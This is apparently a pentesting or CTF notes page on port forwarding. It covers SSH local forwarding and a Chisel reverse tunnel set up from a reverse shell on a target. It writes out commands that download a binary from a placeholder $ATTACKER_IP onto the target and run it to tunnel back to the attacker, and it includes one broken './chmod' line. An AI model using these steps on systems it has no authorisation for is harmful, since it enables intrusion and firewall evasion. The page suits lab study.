# Port Forwarding

## SSH Port Forwarding

I have a SSH access to target machine, and i want to host a target's port to a local port.

```bash
ssh -L local_port:destination_server_ip:remote_port ssh_server_hostname@target_ip
```

For example:

The target machine has a port 3000 hosted in local. I want to see that in my machine on port 8080.

```bash
ssh -L 8080:127.0.0.1:3000 user@10.10.11.68
```



### Port Forwarding without password

If we have a Reverse shell inside a Linux/Windows machine but we dont know a password to make a SSH tunneling, we can use this tool to do this anyway.

{% embed url="https://github.com/jpillora/chisel" %}

_**Chisel** is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. Written in Go (golang). Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network._

```bash
apt install chisel
```

First thing to do is setup a Chisel server in our Kali machine choosing one port to expone the service.

```bash
chisel server --port 8000 -reverse
```

Choose the executable by the target machine OS.

{% embed url="https://github.com/jpillora/chisel/releases/tag/v1.10.1" %}

Now we have to download the executable and transfer it to the target machine.&#x20;

```bash
# example for ubuntu target
wget https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_386.gz
gzip -d chisel_1.10.1_linux_386.gz

# start python http server to transfer the file
python3 -m http.server 8080
```

Then, do this in the target machine to make the port forwarding

```bash
wget http://$ATTACKER_IP:8080/chisel_1.10.1_linux_386
chmod +x chisel_1.10.1_linux_386
./chmod +x chisel_1.10.1_linux_386 
./chisel_1.10.1_linux_386 client $CHISEL_SERVER_IP:$CHISEL_SERVER_PORT R:8989:127.0.0.1:8989
```



